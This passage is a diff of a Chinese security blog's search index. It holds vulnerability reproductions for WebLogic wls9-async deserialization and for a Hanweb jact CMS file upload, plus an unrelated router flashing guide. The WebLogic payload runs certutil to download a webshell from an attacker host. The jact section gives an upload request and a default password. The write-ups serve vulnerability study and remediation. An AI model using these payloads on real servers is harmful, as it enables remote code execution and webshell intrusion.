class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>certutil -urlcache -split -f http://192.168.100.5/cmd.txt servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/cmd.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>使用python3运行脚本即可。</p>
-<p><img data-src="https://s2.loli.net/2023/04/05/RFg1XrTl2G37EjK.png" alt="image-20200608145057355"></p>
-<p>msf配置</p>
-<p><img data-src="https://s2.loli.net/2023/04/05/nLHhTSJEQmaY2q7.png"></p>
+<p>点击request窗口的发送请求按钮，可以看到攻击机上的python web服务有访问请求，说明文件已经成功上传到服务器上。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc11477bda21.png"><img data-src="https://i.loli.net/2019/04/25/5cc11477bda21.png" alt="python-httpserver.png"></a></p>
+<p>通过蚁剑或菜刀连接即可。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
+<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用JD-GUI打开对应War包。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Weblogic9:</span><br><span class="line"><span class="regexp">/%WLS_HOME%/</span>weblogic92<span class="regexp">/server/</span>lib/bea_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic <span class="number">10</span>:</span><br><span class="line"><span class="regexp">/%WLS_HOME%/</span>wlserver_10.<span class="number">3</span><span class="regexp">/server/</span>lib/bea_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic12:</span><br><span class="line"><span class="regexp">/%WLS_HOME%/</span>oracle_common<span class="regexp">/modules/</span>com.oracle.webservices.wls.bea-wls9-async-response_12.<span class="number">1.3</span>.war</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在web.xml里面可以看到基本都是指向<code>weblogic.wsee.async.AsyncResponseBean</code></p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc18b223d1a4.png" alt="web-xml.png"></p>
+<p>跟进<code>weblogic.wsee.async.AsyncResponseBean</code>，可以得知有两个函数handleResult、handleFault。查看<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vbWlkZGxld2FyZS8xMjIxMy93bHMvV0xBUEkvd2VibG9naWMvd3NlZS9hc3luYy9Bc3luY1Jlc3BvbnNlQmVhbi5odG1s">oracle官方<i class="fa fa-external-link-alt"></i></span>对AsyncResponseBean类的描述，查看Method Detail,可以得知handleResult是当异步响应服务收到对请求正常时调用，handleFault是异常时调用。</p>
+<p>根据官方文档可以得知AsyncResponseBean继承AbstractAsyncResponseBean类(<code>%WLS_HOME%/server/lib/weblogic.jar</code>)。在weblogic.wsee.async找到该类。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc1a3cf32429.png" alt="weblogic-abstractasync.png"></p>
+<p>由于不了解weblogic逻辑处理流程，根据查阅的资料所得：该处会与AddressingHandler、AsyncResponseHandler、WorkAreaHandler有关。</p>
+<p>其中WorkAreaHandler被WorkAreaServerHandler和WorkAreaClientHandler继承，而WorkAreaServerHandler的27行处<code>localWorkContextMapInterceptor.receiveRequest(**new** WorkContextXmlInputAdapter(localWorkAreaHeader.getInputStream()));</code>可以看到接受请求用到了WorkContextXmlInputAdapter。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc1a9a55c1b0.png" alt="requests.png"></p>
+<p>跟进该类可以发现该类imoprt了XMLDecoder，而且并没有做过滤。XMLDecoder是用来将XML文件反序列化成java对象。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc1a96f84381.png" alt="XMLDecoder.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1.删除对应war包；</p>
+<p>2.禁用bea_wls9_async_response组件。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次分析还有存在疑难点：weblogic整体的逻辑处理流程是如何，这个需要后续是多了解。</p>
 ]]></content>
       <categories>
         <category>安全</category>
@@ -1380,56 +1407,18 @@
       </tags>
   </entry>
   <entry>
-    <title>weblogic wls9-async rce复现&amp;分析</title>
-    <url>/archives/94f70d04.html</url>
-    <content><![CDATA[<p>针对Weblogic wls9-async反序列化进行漏洞环境搭建及复现。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
+    <title>大汉CMS-jact任意文件上传</title>
+    <url>/archives/ae1f095f.html</url>
+    <content><![CDATA[<p>在护网的时候，许多目标都用大汉jact这套系统。根据“小道消息”说是有最新的任意文件上传！<img data-src="https://s2.loli.net/2023/04/06/jmcwoWMYTx54lyk.png" alt="hanweb-decode"></p>
 <span id="more"></span>
 
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>服务器需要安装jdk,这里采用1.7版本。</p>
-<p>在<span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9taWRkbGV3YXJlL3dlYmxvZ2ljL2Rvd25sb2Fkcy93bHMtbWFpbi0wOTcxMjcuaHRtbA==">Oracle官网<i class="fa fa-external-link-alt"></i></span>下载对应版本,这里使用的12.1.3(10.x版本也可以的)。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc10e75259ba.png"><img data-src="https://i.loli.net/2019/04/25/5cc10e75259ba.png" alt="oracle-download.png"></a></p>
-<p>下载完成之后，通过<code>java -jar fmw_12.1.3.0.0_wls.jar</code>启动安装程序，默认安装即可。安装完成之后启动weblogic。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc10f794723e.png"><img data-src="https://i.loli.net/2019/04/25/5cc10f794723e.png" alt="weblogic-start.png"></a></p>
-<p>通过浏览器访问查看服务是否启动。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc10fb8dade5.png"><img data-src="https://i.loli.net/2019/04/25/5cc10fb8dade5.png" alt="weblogic-bro.png"></a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在攻击机上通过python启动一个web服务，该目录下放一个webshell。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span> <span class="comment"># python2</span></span><br><span class="line">python3 -m http.server <span class="comment"># python3</span></span><br></pre></td></tr></table></figure>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这个问题在2014年5月12号的时候在<span class="exturl" data-url="aHR0cHM6Ly93eS56b25lLmNpL2J1Z19kZXRhaWwucGhwP3d5YnVnX2lkPXdvb3l1bi0yMDE0LTA2MDI3Ng==">乌云<i class="fa fa-external-link-alt"></i></span>上提交过，8月10号公开出来的。根据乌云描述(<code>jact的该操作又有所不同，区别还是在用户验证上，jact中最后查询用户名密码的时候是用hibernate预处理，目测不能绕过，只有提供正确用户名密码才能上传。</code>)来看关键是需要正确的用户密码。而最近这个说的任意文件上传关键点在于系统内置的默认用户。如果手头上有大汉老版本的，可以查看对应用户表即可成功利用该漏洞</p>
+<p>jact&#x2F;services&#x2F;wsinfo</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">POST /jsearch/webservice/wsInfo HTTP/1.0</span><br><span class="line">Content-Type: multipart/related; type=&quot;text/xml&quot;; start=&quot;<span class="tag">&lt;<span class="name">CB69CE057274B576D4C44A9112AE8DE8</span>&gt;</span>&quot;; 	boundary=&quot;----=_Part_0_9532399.1399678337692&quot;</span><br><span class="line">Accept: application/soap+xml, application/dime, multipart/related, text/*</span><br><span class="line">User-Agent: Axis/1.2</span><br><span class="line">Host: target.com</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 1084</span><br><span class="line">------=_Part_0_9532399.1399678337692</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line">Content-Id: <span class="tag">&lt;<span class="name">CB69CE057274B576D4C44A9112AE8DE8</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ns1:receivefile</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xmlns:ns1</span>=<span class="string">&quot;http://target.com/jsearch/webservice/wsInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strLoginId</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strLoginId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strPwd</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strPwd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strKey</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strKey</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">href</span>=<span class="string">&quot;cid:1AA0D9D06D1918F13C495E8419BE26EB&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;ns2:DataHandler&quot;</span> <span class="attr">xmlns:ns2</span>=<span class="string">&quot;ns:FileUploadHandler&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fileName</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span>test.jsp<span class="tag">&lt;/<span class="name">fileName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iState</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:int&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">iState</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ns1:receivefile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br><span class="line"></span><br><span class="line">------=_Part_0_9532399.1399678337692</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line">Content-Id: &lt;1AA0D9D06D1918F13C495E8419BE26EB&gt;</span><br><span class="line"></span><br><span class="line">&lt;%=&quot;hello world!&quot;%&gt;</span><br><span class="line">------=_Part_0_9532399.1399678337692--</span><br></pre></td></tr></table></figure>
 
-<p>由于是soap，先访问一下<span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvX2FzeW5jL0FzeW5jUmVzcG9uc2VTZXJ2aWNlP1dTREw=">http://ip:port/_async/AsyncResponseService?WSDL<i class="fa fa-external-link-alt"></i></span> ，看下格式结构。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc1105a91737.png"><img data-src="https://i.loli.net/2019/04/25/5cc1105a91737.png" alt="weblogic-wsdl.png"></a></p>
-<p>通过SOAP-UI进行请求构建，新建一个soap，在Initial WSDL输入刚刚的url。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc110c956692.png"><img data-src="https://i.loli.net/2019/04/25/5cc110c956692.png" alt="weblogic-soap.png"></a></p>
-<p>新建一个request请求。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc111862585f.png"><img data-src="https://i.loli.net/2019/04/25/5cc111862585f.png" alt="new-requests.png"></a></p>
-<p>将下列代码贴进请求包中，需要注意的是string标签下面的ip、port、webshell.txt这些需要按照自己的环境进行修改。我的攻击机ip为192.168.100.5 port为80 webshell.txt为cmd.txt。</p>
-<p>上传的路径：</p>
-<p>12版本<code>servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/</code></p>
-<p>10版本<code>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</code>。</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>certutil -urlcache -split -f http://192.168.100.5/cmd.txt servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/cmd.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>点击request窗口的发送请求按钮，可以看到攻击机上的python web服务有访问请求，说明文件已经成功上传到服务器上。</p>
-<p><a href="https://i.loli.net/2019/04/25/5cc11477bda21.png"><img data-src="https://i.loli.net/2019/04/25/5cc11477bda21.png" alt="python-httpserver.png"></a></p>
-<p>通过蚁剑或菜刀连接即可。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
-<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用JD-GUI打开对应War包。</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Weblogic9:</span><br><span class="line"><span class="regexp">/%WLS_HOME%/</span>weblogic92<span class="regexp">/server/</span>lib/bea_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic <span class="number">10</span>:</span><br><span class="line"><span class="regexp">/%WLS_HOME%/</span>wlserver_10.<span class="number">3</span><span class="regexp">/server/</span>lib/bea_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic12:</span><br><span class="line"><span class="regexp">/%WLS_HOME%/</span>oracle_common<span class="regexp">/modules/</span>com.oracle.webservices.wls.bea-wls9-async-response_12.<span class="number">1.3</span>.war</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在web.xml里面可以看到基本都是指向<code>weblogic.wsee.async.AsyncResponseBean</code></p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc18b223d1a4.png" alt="web-xml.png"></p>
-<p>跟进<code>weblogic.wsee.async.AsyncResponseBean</code>，可以得知有两个函数handleResult、handleFault。查看<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vbWlkZGxld2FyZS8xMjIxMy93bHMvV0xBUEkvd2VibG9naWMvd3NlZS9hc3luYy9Bc3luY1Jlc3BvbnNlQmVhbi5odG1s">oracle官方<i class="fa fa-external-link-alt"></i></span>对AsyncResponseBean类的描述，查看Method Detail,可以得知handleResult是当异步响应服务收到对请求正常时调用，handleFault是异常时调用。</p>
-<p>根据官方文档可以得知AsyncResponseBean继承AbstractAsyncResponseBean类(<code>%WLS_HOME%/server/lib/weblogic.jar</code>)。在weblogic.wsee.async找到该类。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc1a3cf32429.png" alt="weblogic-abstractasync.png"></p>
-<p>由于不了解weblogic逻辑处理流程，根据查阅的资料所得：该处会与AddressingHandler、AsyncResponseHandler、WorkAreaHandler有关。</p>
-<p>其中WorkAreaHandler被WorkAreaServerHandler和WorkAreaClientHandler继承，而WorkAreaServerHandler的27行处<code>localWorkContextMapInterceptor.receiveRequest(**new** WorkContextXmlInputAdapter(localWorkAreaHeader.getInputStream()));</code>可以看到接受请求用到了WorkContextXmlInputAdapter。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc1a9a55c1b0.png" alt="requests.png"></p>
-<p>跟进该类可以发现该类imoprt了XMLDecoder，而且并没有做过滤。XMLDecoder是用来将XML文件反序列化成java对象。</p>
-<p><img data-src="https://i.loli.net/2019/04/25/5cc1a96f84381.png" alt="XMLDecoder.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1.删除对应war包；</p>
-<p>2.禁用bea_wls9_async_response组件。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次分析还有存在疑难点：weblogic整体的逻辑处理流程是如何，这个需要后续是多了解。</p>
+<p>上传成功之后，具体落地路径为：<code>jact/main/jact/commonuser/transact/temp/Data/test.jsp</code>其中Data为当前年月，例如：20XXXX</p>
+<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><p>默认存在某个用户，密码为hanweb。</p>
+<p><img data-src="https://s2.loli.net/2023/04/06/jmcwoWMYTx54lyk.png" alt="hanweb-decode"></p>
 ]]></content>
       <categories>
         <category>安全</category>
@@ -1437,6 +1426,38 @@
       </categories>
       <tags>
         <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小米AX3600 TTL刷机</title>
+    <url>/archives/ed29cee2.html</url>
+    <content><![CDATA[<p>心血来潮把ax3600刷成openwrt 5.15内核，然后直接通过web界面（没清配置）降级到5.10，导致直接刷成砖。后面通过ttl成功救回来。</p>
+<p><img data-src="https://s2.loli.net/2022/03/28/zBLkYT5yaWqoZX3.png" alt="AX3600-黄灯"></p>
+<span id="more"></span>
+
+<h1 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h1><p>把底部螺丝都拆下来之后，把卡扣翘起来就可以了。卡扣有点紧，要小心。</p>
+<p><img data-src="https://s2.loli.net/2022/03/28/NFwmTqpCt7abfYn.png" alt="AX3600-拆机"></p>
+<p>由于板子没有预留插座，需要自己焊一个插座上去。这时候就需要把天线、主板螺丝都卸下来。建议拍照，以免忘记如何布局。</p>
+<p><img data-src="https://s2.loli.net/2022/03/28/5HwyivaA6xqpDtM.png" alt="AX3600-主版"></p>
+<p>焊完插座，接上TTL就可以接着操作了。Ps：TTL接的时候需要RX-TX、TX—RX。</p>
+<p><img data-src="https://s2.loli.net/2022/03/28/JnAo2l1V6ObKXv5.png" alt="AX3600-TTL"></p>
+<h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>修改速率为115200，通过xshell、putty等任意工具连接</p>
+<p><img data-src="https://s2.loli.net/2022/03/28/Lh6XwAzR2uYflop.png" alt="AX3600-115200"></p>
+<p>Xshell连接之后，先不要接路由器，修改网卡速率为100M全双工，之后修改本地ip地址为192.168.31.100。最后接上网线（主机-路由器lan口）</p>
+<p><img data-src="https://s2.loli.net/2022/03/28/eKrY8AbqIxGaFhw.png" alt="AX3600-100m"></p>
+<p>现在重启路由器，等黄灯亮起来1s左右，接上杜邦线。Ps：如果先接上线，再重启路由器会导致路由器无法正常启动。</p>
+<p>由于AX3600是双分区，我刷机的时候是将openwrt刷到rootfs_1分区。为了避免问题，把rootfs、rootfs_1两个分区都擦除。TTL命令如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv serverip 192.168.31.100</span><br><span class="line">setenv ipaddr 192.168.31.1</span><br><span class="line">tftpboot xx.ubi // 对应的ubi文件</span><br><span class="line">smeminfo  <span class="comment">#查看mtd12（roofs）和roofs1地址</span></span><br><span class="line"></span><br><span class="line">nand erase 0xa00000  0x23c0000 <span class="comment"># 擦除rootfs分区</span></span><br><span class="line">nand erase 0x2dc0000 0x8000000 <span class="comment">#擦除rootfs_1和后面所有数据</span></span><br><span class="line">nand write 0x44000000 0x2dc0000 0x1ac0000 <span class="comment">#将44000000数据写入2dc0000 写入数据大小为1ac0000 需根据ubi文件大小进行写入</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://s2.loli.net/2022/03/28/gFiynuozKwENRCJ.png" alt="AX3600-UBOOT"></p>
+<p>最后断电重启即可成功恢复，记得把ttl线拔下来。</p>
+]]></content>
+      <categories>
+        <category>瞎折腾</category>
+        <category>IOT</category>
+      </categories>
+      <tags>
+        <tag>路由器</tag>
       </tags>
   </entry>
   <entry>
@@ -1751,28 +1772,6 @@
       </tags>
   </entry>
   <entry>
-    <title>大汉CMS-jact任意文件上传</title>
-    <url>/archives/ae1f095f.html</url>
-    <content><![CDATA[<p>在护网的时候，许多目标都用大汉jact这套系统。根据“小道消息”说是有最新的任意文件上传！<img data-src="https://s2.loli.net/2023/04/06/jmcwoWMYTx54lyk.png" alt="hanweb-decode"></p>
-<span id="more"></span>
-
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这个问题在2014年5月12号的时候在<span class="exturl" data-url="aHR0cHM6Ly93eS56b25lLmNpL2J1Z19kZXRhaWwucGhwP3d5YnVnX2lkPXdvb3l1bi0yMDE0LTA2MDI3Ng==">乌云<i class="fa fa-external-link-alt"></i></span>上提交过，8月10号公开出来的。根据乌云描述(<code>jact的该操作又有所不同，区别还是在用户验证上，jact中最后查询用户名密码的时候是用hibernate预处理，目测不能绕过，只有提供正确用户名密码才能上传。</code>)来看关键是需要正确的用户密码。而最近这个说的任意文件上传关键点在于系统内置的默认用户。如果手头上有大汉老版本的，可以查看对应用户表即可成功利用该漏洞</p>
-<p>jact&#x2F;services&#x2F;wsinfo</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">POST /jsearch/webservice/wsInfo HTTP/1.0</span><br><span class="line">Content-Type: multipart/related; type=&quot;text/xml&quot;; start=&quot;<span class="tag">&lt;<span class="name">CB69CE057274B576D4C44A9112AE8DE8</span>&gt;</span>&quot;; 	boundary=&quot;----=_Part_0_9532399.1399678337692&quot;</span><br><span class="line">Accept: application/soap+xml, application/dime, multipart/related, text/*</span><br><span class="line">User-Agent: Axis/1.2</span><br><span class="line">Host: target.com</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 1084</span><br><span class="line">------=_Part_0_9532399.1399678337692</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line">Content-Id: <span class="tag">&lt;<span class="name">CB69CE057274B576D4C44A9112AE8DE8</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ns1:receivefile</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xmlns:ns1</span>=<span class="string">&quot;http://target.com/jsearch/webservice/wsInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strLoginId</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strLoginId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strPwd</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strPwd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strKey</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strKey</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">href</span>=<span class="string">&quot;cid:1AA0D9D06D1918F13C495E8419BE26EB&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;ns2:DataHandler&quot;</span> <span class="attr">xmlns:ns2</span>=<span class="string">&quot;ns:FileUploadHandler&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fileName</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span>test.jsp<span class="tag">&lt;/<span class="name">fileName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iState</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:int&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">iState</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ns1:receivefile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br><span class="line"></span><br><span class="line">------=_Part_0_9532399.1399678337692</span><br><span class="line">Content-Type: 